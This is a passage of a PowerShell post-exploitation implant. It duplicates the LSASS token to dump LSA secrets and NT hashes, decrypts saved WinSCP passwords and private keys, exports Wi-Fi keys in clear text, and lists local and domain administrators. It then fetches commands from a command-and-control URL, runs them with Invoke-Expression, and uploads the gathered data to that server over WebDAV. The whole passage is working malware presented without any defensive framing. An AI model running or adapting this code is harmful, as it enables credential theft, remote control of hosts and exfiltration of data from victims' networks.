  POLICY_CREATE_ACCOUNT = 0x00000010L,
  POLICY_CREATE_SECRET = 0x00000020L,
  POLICY_CREATE_PRIVILEGE = 0x00000040L,
  POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
  POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
  POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
  POLICY_SERVER_ADMIN = 0x00000400L,
  POLICY_LOOKUP_NAMES = 0x00000800L,
  POLICY_NOTIFICATION = 0x00001000L
}

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaRetrievePrivateData(
  IntPtr PolicyHandle,
  ref LSA_UNICODE_STRING KeyName,
  out IntPtr PrivateData
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaStorePrivateData(
  IntPtr policyHandle,
  ref LSA_UNICODE_STRING KeyName,
  ref LSA_UNICODE_STRING PrivateData
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaOpenPolicy(
  ref LSA_UNICODE_STRING SystemName,
  ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
  uint DesiredAccess,
  out IntPtr PolicyHandle
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaNtStatusToWinError(
  uint status
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaClose(
  IntPtr policyHandle
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaFreeMemory(
  IntPtr buffer
);
"@

Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
}

  Process{
    foreach($key in $RegistryKey) {
      $regPath = "HKLM:\\SECURITY\Policy\Secrets\" + $key
      $tempRegPath = "HKLM:\\SECURITY\Policy\Secrets\MySecret"
      $myKey = "MySecret"
      if(Test-Path $regPath) {
        Try {
          Get-ChildItem $regPath -ErrorAction Stop | Out-Null
        }
        Catch {
          Write-Error -Message "Access to registry Denied, run as NT AUTHORITY\SYSTEM" -Category PermissionDenied
          Break
        }      

        if(Test-Path $regPath) {
          # Copy Key
          "CurrVal","OldVal","OupdTime","CupdTime","SecDesc" | ForEach-Object {
            $copyFrom = "HKLM:\SECURITY\Policy\Secrets\" + $key + "\" + $_
            $copyTo = "HKLM:\SECURITY\Policy\Secrets\MySecret\" + $_

            if( -not(Test-Path $copyTo) ) {
              mkdir $copyTo | Out-Null
            }
            $item = Get-ItemProperty $copyFrom
            Set-ItemProperty -Path $copyTo -Name '(default)' -Value $item.'(default)'
          }
        }
        # Attributes
        $objectAttributes = New-Object LSAUtil.LSAUtil+LSA_OBJECT_ATTRIBUTES
        $objectAttributes.Length = 0
        $objectAttributes.RootDirectory = [IntPtr]::Zero
        $objectAttributes.Attributes = 0
        $objectAttributes.SecurityDescriptor = [IntPtr]::Zero
        $objectAttributes.SecurityQualityOfService = [IntPtr]::Zero

        # localSystem
        $localsystem = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
        $localsystem.Buffer = [IntPtr]::Zero
        $localsystem.Length = 0
        $localsystem.MaximumLength = 0

        # Secret Name
        $secretName = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
        $secretName.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($myKey)
        $secretName.Length = [Uint16]($myKey.Length * [System.Text.UnicodeEncoding]::CharSize)
        $secretName.MaximumLength = [Uint16](($myKey.Length + 1) * [System.Text.UnicodeEncoding]::CharSize)

        # Get LSA PolicyHandle
        $lsaPolicyHandle = [IntPtr]::Zero
        [LSAUtil.LSAUtil+LSA_AccessPolicy]$access = [LSAUtil.LSAUtil+LSA_AccessPolicy]::POLICY_GET_PRIVATE_INFORMATION
        $lsaOpenPolicyHandle = [LSAUtil.LSAUtil]::LSAOpenPolicy([ref]$localSystem, [ref]$objectAttributes, $access, [ref]$lsaPolicyHandle)

        if($lsaOpenPolicyHandle -ne 0) {
          Write-Warning "lsaOpenPolicyHandle Windows Error Code: $lsaOpenPolicyHandle"
          Continue
        }

        # Retrieve Private Data
        $privateData = [IntPtr]::Zero
        $ntsResult = [LSAUtil.LSAUtil]::LsaRetrievePrivateData($lsaPolicyHandle, [ref]$secretName, [ref]$privateData)      
        
        $lsaClose = [LSAUtil.LSAUtil]::LsaClose($lsaPolicyHandle)

        $lsaNtStatusToWinError = [LSAUtil.LSAUtil]::LsaNtStatusToWinError($ntsResult)

        if($lsaNtStatusToWinError -ne 0) {
          Write-Warning "lsaNtsStatusToWinError: $lsaNtStatusToWinError"
        }

        [LSAUtil.LSAUtil+LSA_UNICODE_STRING]$lusSecretData =
        [LSAUtil.LSAUtil+LSA_UNICODE_STRING][System.Runtime.InteropServices.marshal]::PtrToStructure($privateData, [System.Type][LSAUtil.LSAUtil+LSA_UNICODE_STRING])

        Try {
          [string]$value = [System.Runtime.InteropServices.marshal]::PtrToStringAuto($lusSecretData.Buffer)
          $value = $value.SubString(0, ($lusSecretData.Length / 2))
        }
        Catch {
          $value = ""
        }

        if($key -match "^_SC_") {
          # Get Service Account
          $serviceName = $key -Replace "^_SC_"
          Try {
            # Get Service Account
            $service = Get-WmiObject -Query "SELECT StartName FROM Win32_Service WHERE Name = '$serviceName'" -ErrorAction Stop
            $account = $service.StartName
          }
          Catch {
            $account = ""
          }
        } else {
          $account = ""
        }

        # Return Object
        New-Object PSObject -Property @{
          Name = $key;
          Secret = $value;
          Account = $Account
        } | Select-Object Name, Account, Secret, @{Name="ComputerName";Expression={$env:COMPUTERNAME}}
      } else {
        Write-Error -Message "Path not found: $regPath" -Category ObjectNotFound
      }
    }
  }
  end {
    if(Test-Path $tempRegPath) {
      Remove-Item -Path "HKLM:\\SECURITY\Policy\Secrets\MySecret" -Recurse -Force
    }
  }
}

function Enable-TSDuplicateToken {
<#
  .SYNOPSIS
  Duplicates the Access token of lsass and sets it in the current process thread.

  .DESCRIPTION
  The Enable-TSDuplicateToken CmdLet duplicates the Access token of lsass and sets it in the current process thread.
  The CmdLet must be run with elevated permissions.

  .EXAMPLE
  Enable-TSDuplicateToken

  .LINK
  http://www.truesec.com

  .NOTES
  Goude 2012, TreuSec
#>
[CmdletBinding()]
param()

$signature = @"
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
     public struct TokPriv1Luid
     {
         public int Count;
         public long Luid;
         public int Attr;
     }

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const int TOKEN_QUERY = 0x00000008;
    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;

    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
    public const UInt32 TOKEN_DUPLICATE = 0x0002;
    public const UInt32 TOKEN_IMPERSONATE = 0x0004;
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
      TOKEN_ADJUST_SESSIONID);

    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege";
    public const int ANYSIZE_ARRAY = 1;

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID
    {
      public UInt32 LowPart;
      public UInt32 HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
       public LUID Luid;
       public UInt32 Attributes;
    }


    public struct TOKEN_PRIVILEGES {
      public UInt32 PrivilegeCount;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)]
      public LUID_AND_ATTRIBUTES [] Privileges;
    }

    [DllImport("advapi32.dll", SetLastError=true)]
     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int
        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);


    [DllImport("advapi32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool SetThreadToken(
      IntPtr PHThread,
      IntPtr Token
    );

    [DllImport("advapi32.dll", SetLastError=true)]
     [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool OpenProcessToken(IntPtr ProcessHandle, 
       UInt32 DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

    [DllImport("kernel32.dll", ExactSpelling = true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
"@

  $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
  if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
    Write-Warning "Run the Command as an Administrator"
    Break
  }

  Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv
  $adjPriv = [AdjPriv.AdjPriv]
  [long]$luid = 0

  $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid
  $tokPriv1Luid.Count = 1
  $tokPriv1Luid.Luid = $luid
  $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED

  $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid)

  [IntPtr]$htoken = [IntPtr]::Zero
  $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken)
  
  
  $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES
  $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)

  if(-not($retVal)) {
    [System.Runtime.InteropServices.marshal]::GetLastWin32Error()
    Break
  }

  $process = (Get-Process -Name lsass)
  [IntPtr]$hlsasstoken = [IntPtr]::Zero
  $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken)

  [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero
  $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle)

  $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle)
  if(-not($retVal)) {
    [System.Runtime.InteropServices.marshal]::GetLastWin32Error()
  }
}

"======================================================================="
"	LSA Secrets"
"======================================================================="
Enable-TSDuplicateToken
Get-TSLsaSecret | where {$_.account -ne ""}
"======================================================================="
"	NT User Hashes"
"======================================================================="
DumpHashes

}  | Out-Null

Start-Job -Name WinSCP -ScriptBlock {


function Get-IniContent
{
<#
.SYNOPSIS
Reads an INI file producing a more easily navigated structure.

.DESCRIPTION
Get-IniContent reads the content of an ini file and turns it into a really easily read and navigated PowerShell object.

.PARAMETER FilePath
path to ini file to be read

.INPUTS
Nothing can be piped directly into this function

.OUTPUTS
Output will be an object representing the ini file.

.EXAMPLE

.NOTES
NAME: 
AUTHOR: 
LASTEDIT: 
KEYWORDS:

.LINK http://blogs.technet.com/b/heyscriptingguy/archive/2011/08/20/use-powershell-to-work-with-any-ini-file.aspx

#>

[CMDLetBinding()]
Param 
(
	[String] $filePath
)

If (! (Test-Path $filePath))
{
	throw "ini file could not be found"
}

$ini = @{}
switch -regex -file $FilePath
{
    "^\[(.+)\]" # Section
    {
        $section = $matches[1]
        $ini[$section] = @{}
        $CommentCount = 0
    }
    "^(;.*)$" # Comment
    {
        $value = $matches[1]
        $CommentCount = $CommentCount + 1
        $name = "Comment" + $CommentCount
        $ini[$section][$name] = $value
    }
    "(.+?)\s*=(.*)" # Key
    {
        $name,$value = $matches[1..2]
        $ini[$section][$name] = $value
    }
}
return $ini

}

#
# dec_next_char and decrypt-winscppassword are based upon metasploit framework
#	https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/winscp.rb
#
$PWALG_MAGIC = 0xA3
$PWALG_BASE = "0123456789ABCDEF"
$PWALG_MAXLEN = 50
$PWALG_FLAG = 0xFF

function dec_next_char
{
	if ($global:pwd.length -gt 0)
	{
		$a = $PWALG_BASE.indexof($global:pwd[0])
		$a = $a -shl 4
		$b = $PWALG_BASE.indexof($global:pwd[1])
		$result = -bnot (($a + $b) -bxor $PWALG_MAGIC) -band 0xff
		$global:pwd = $global:pwd.remove(0,2)
		return $result
	}
}

function decrypt-winscppassword
{
<#
.SYNOPSIS

.DESCRIPTION

.PARAMETER

.INPUTS
Nothing can be piped directly into this function

.EXAMPLE

.EXAMPLE

.OUTPUTS

.NOTES
NAME: 
AUTHOR: 
LASTEDIT: 
KEYWORDS:

.LINK

#>
[CMDLetBinding()]
param
(
	[Parameter(mandatory=$true)] [String] $password,
	[Parameter(mandatory=$true)] [String] $username,
	[Parameter(mandatory=$true)] [String] $hostname
)

$key = $username + $hostname
$global:pwd =$password
$flag = dec_next_char
$length = 0
$ldel = 0

Write-Verbose "flag $flag"
if ($flag -eq $PWALG_FLAG)
{
	dec_next_char | Out-Null
	$length = dec_next_char
} else {
	$length = $flag
}
Write-Verbose "Length $length"

$ldel = (dec_next_char) * 2
Write-Verbose "ldel $ldel"

$global:pwd = $global:pwd.substring($ldel)

$result = ""

for ($ss =0; $ss -lt $length; $ss++)
{
	$result = $result + [char] (dec_next_char)
}

Write-Verbose "Result pre trim $result"

if ($flag -eq $PWALG_FLAG)
{
	$result = $result.substring($key.length)
}

Write-Verbose "Result returned $result"

return $result

}

Function Get-WinSCPRegistrySessions
{
	$UserHives = Get-ChildItem -Path Registry::HKEY_USERS\
	$WINSCPRegistryKeys = $UserHives | foreach {Get-ChildItem "Registry::$($_.name)\Software\Martin Prikryl\WinSCP 2\Sessions" -ErrorAction silentlycontinue } | foreach {Get-ItemProperty $_.pspath}
	foreach ($regkey in $WINSCPRegistryKeys)
	{
		$SSHUsername = $regkey.Username
		$SSHHost = $regkey.Hostname
		$SSHEncPassword = $regkey.Password
		$SSHDecPassword = "No Password Saved"
		if ($SSHEncPassword -ne $null)
		{
			$SSHDecPassword = Decrypt-winscppassword -password $SSHEncPassword -username $SSHUsername -hostname $SSHHost
		}
		$SSHKeyFile = $regkey.PublicKeyFile
		$SSHKeyFileContents = "No key file specified"
		if ($SSHKeyFile -ne $null)
		{
			$SSHKeyFileContents = Get-Content ($SSHKeyFile.replace("%5C", "\"))
		}
		"Hostname: $SSHHost"
		"Username: $SSHUsername"
		"Password: $SSHDecPassword"
		"Private Key"
		"----------------------------------------------------------"
		$SSHKeyFileContents
		"----------------------------------------------------------"
	}
	
}

Function Get-WinSCPIniSessions
{
	$WinSCPINI = Get-ChildItem -Path c:\users -Filter 'WinSCP.ini' -Recurse -ErrorAction SilentlyContinue -Force
	$WinSCPINI = $WinSCPINI + (Get-ChildItem -Path 'c:\program files\Winscp' -Filter 'WinSCP.ini' -Recurse -ErrorAction SilentlyContinue -Force)
	$WinSCPINI = $WinSCPINI + (Get-ChildItem -Path 'c:\program files (x86)\Winscp' -Filter 'WinSCP.ini' -Recurse -ErrorAction SilentlyContinue -Force)

	foreach ($inifile in $WinSCPINI)
	{
		$inifile.fullname
		$inifilecontent = Get-IniContent $inifile.fullname
		$Sessions = $inifilecontent.keys | where {$_.startswith("Sessions")}
		foreach ($session in $Sessions)
		{		
			$SSHUsername = $inifilecontent.$session.Username
			$SSHHost = $inifilecontent.$session.Hostname
			$SSHEncPassword = $inifilecontent.$session.Password
			$SSHDecPassword = "No Password Saved"
			$SSHKeyFile = $inifilecontent.$session.PublicKeyFile
			$SSHKeyFileContents = "No key file specified"
			if ($SSHKeyFile -ne $null)
			{
				$SSHKeyFileContents = Get-Content ($SSHKeyFile.replace("%5C", "\"))
			}
			"Hostname: $SSHHost"
			"Username: $SSHUsername"
			"Encrypted Password $SSHEncPassword"
			if ($SSHEncPassword -ne $null)
			{
				$SSHDecPassword = Decrypt-winscppassword -password $SSHEncPassword -username $SSHUsername -hostname $SSHHost -verbose
			}
			"Password: $SSHDecPassword"
			"Private Key"
			"----------------------------------------------------------"
			$SSHKeyFileContents
			"----------------------------------------------------------"
		}
	}
}

"======================================================================="
"	WINSCP Sessions in registry"
"======================================================================="
Get-WinSCPRegistrySessions
"======================================================================="
"	WINSCP.ini Sessions"
"======================================================================="
Get-WinSCPIniSessions

} | Out-Null

Start-Job -Name BasicInfo -ScriptBlock {

	Function Get-ExternalIPAddress
	{
		Param
		(
		        [String]$ipcheckurl = "http://icanhazip.com/"
		        #Alternative URLS
		        #       http://automation.whatismyip.com/n09230945.asp
		        #       http://whatismyip.akamai.com/
		        #       http://b10m.swal.org/ip
		)
		$wc = New-Object Net.WebClient
		$wc.headers["UserAgent"] = "Mozilla/5.0 (Windows NT 6.2; WOW64)"
		return $wc.downloadstring($ipcheckurl)
	}

	#http://blogs.technet.com/b/heyscriptingguy/archive/2013/10/27/the-admin-s-first-steps-local-group-membership.aspx
	function get-localgroupmember {

		[CmdletBinding()]
		
		param(
		
		[parameter(ValueFromPipeline=$true,
		
		   ValueFromPipelineByPropertyName=$true)]
		
		   [string[]]$computername = $env:COMPUTERNAME
		
		)
		
		BEGIN {
		
		Add-Type -AssemblyName System.DirectoryServices.AccountManagement
		
		$ctype = [System.DirectoryServices.AccountManagement.ContextType]::Machine
		
		}
		
		 
		
		PROCESS{
		
		foreach ($computer in $computername) {
		
		  $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ctype, $computer
		
		  $idtype = [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName
		
		  $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($context, $idtype, 'Administrators')
		
		  $group.Members |
		
		  select @{N='Server'; E={$computer}}, @{N='Domain'; E={$_.Context.Name}}, samaccountName
		
		} # end foreach
		
		} # end PROCESS
		
		}

	"======================================================================="
	"	Basic Information"
	"======================================================================="
	$OSWIMI = Get-WmiObject Win32_OperatingSystem
	$COMPWMI = Get-WmiObject Win32_Computersystem
	"Hostname: $($ENV:Computername)"
	"Operating System: $($OSWIMI.Caption)"
	"CPU: $((Get-WmiObject Win32_Processor).Caption)"
	"Memory: $($OSWIMI.TotalVisibleMemorySize) kb"
	"Country Code: $($OSWIMI.CountryCode)"
	"OS Arch: $($OSWIMI.OSArchitecture)"
	if ($COMPWMI.Workgroup -eq $null)
	{
		"Is a domain member"
		"Domain name is: $($COMPWMI.Domain)"
	}
	else
	{
		"Is not a member of domain"
		"Workgroup name is: $($COMPWMI.Workgroup)"
	}
	"======================================================================="
	"	Internal/Local IP"
	"======================================================================="
	Get-NetIPAddress | ft interfacealias, ipaddress
	"======================================================================="
	"	External IP"
	"======================================================================="
	#Get-ExternalIPAddress
	"======================================================================="
	"	DNS Servers"
	"======================================================================="
	Get-DnsClientServerAddress | ft interfacealias, serveraddresses
	"======================================================================="
	"	Disks"
	"======================================================================="
	Get-Disk | ft
	"======================================================================="
	"	Volumes"
	"======================================================================="
	Get-Volume | ft
	"======================================================================="
	"	Services"
	"======================================================================="
	Get-Service | ft
	"======================================================================="
	"	WLAN PROFILES"
	"======================================================================="
	#http://poshcode.org/1700
	$wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
	$exportdata = $wlans | ForEach-Object {$_.Replace("    All User Profile     : ",$null)}
	$exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}
	
	"======================================================================="
	"	Local Administrators"
	"======================================================================="
	get-localgroupmember | ft SamAccountname, Domain
	
	if ($COMPWMI.Workgroup -eq $null)
	{
		"======================================================================="
		"	Members of group: domain admins"
		"======================================================================="
		#http://myitforum.com/cs2/blogs/yli628/archive/2007/08/28/powershell-script-to-list-group-members-in-active-directory.aspx
		$root=([ADSI]"").distinguishedName
		# You can change Domain Admins to any group interested and of course modify the path
		$Group = [ADSI]("LDAP://CN=Domain Admins, CN=Users,"+ $root)
		$Group.member | foreach {$_.split(",")[0].split("=")[1]}
		"======================================================================="
		"	Members of group: Domain Controllers"
		"======================================================================="
		$dc = [adsi]("LDAP://ou=domain controllers,"+$root)
		$dc.psbase.Children | foreach {$_.name}
	}
	
} | Out-Null


#Use the webclient to download the commands as a string, and convert them from their CSV format
$commands = Get-WebPage $C2CommandsURL -Credentials $C2Credentials -erroraction SilentlyContinue | ConvertFrom-Csv -Header('id','expression','hostname')
#did we get any commands
if ($commands) {
	"Successfully captured commands from C&C"
	# get list of previously run commands
	$previouslyexecutedcommands = Get-Content $previouslycompletefile -ErrorAction SilentlyContinue 
	# Filter list of commands to remove those already processed
	$commands = $commands | Where-Object { !( $previouslyexecutedcommands -contains $_.id) }
	#remove any where the hostname is not ours, or not blank
	$commands = $commands | Where-Object { ($_.hostname -eq "") -or ($_.hostname -eq $hostname)}
	# if after all of this filtering, we have some tasks left, then we need to run them
	if ($commands) {
		"We have tasks to run"
		# execute each remaining task and mark if successfully run
		foreach ($command in $commands) {
			"Executing: $($command.expression)"
			# clear error state
			$error.clear()
			# run the expression
			Invoke-Expression $command.expression
			# if no errors occured, mark as completed, otherwise record the errors
			if ($error)
			{
				$error | Out-File $errorfile -Append
			} else {
				$command.id | Out-File $previouslycompletefile -Append
			}
		}
	} else {
		"No new commands found"
	}
} else {
	"No Commands found - possible error talking to C&C?"
}

while (Get-Job -state "Running")
{
	"Waiting for jobs to complete"
	Get-Job | ft Name, state
	sleep 5
}

Receive-Job -name BasicInfo | Out-File -FilePath $hostinfofile -Append
Remove-Job -name BasicInfo

Receive-Job -name winscp | Out-File -FilePath $hostinfofile -Append
Remove-Job -name winscp

Receive-Job -name 32bitjobs | Out-File -FilePath $hostinfofile -Append
Remove-Job -name 32bitjobs

Get-Date | Out-File -FilePath $hostinfofile -Append

Send-WebDAVFile -Credentials $C2Credentials -LocalFile $hostinfofile -URL $C2CheckinURL
Send-WebDAVFile -Credentials $C2Credentials -LocalFile $errorfile -URL $C2CheckinURL

Remove-Item	$errorfile
